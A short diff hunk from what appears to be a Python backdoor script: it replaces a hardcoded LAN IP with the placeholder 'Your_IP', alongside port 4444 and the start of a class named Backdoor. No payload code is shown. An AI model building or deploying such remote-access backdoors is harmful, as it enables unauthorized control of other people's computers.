@@ -7,7 +7,7 @@ import os
 import base64
 
 
-Ip_Adress = "192.168.1.230"
+Ip_Adress = "Your_IP"
 Port = 4444
 
 class Backdoor:
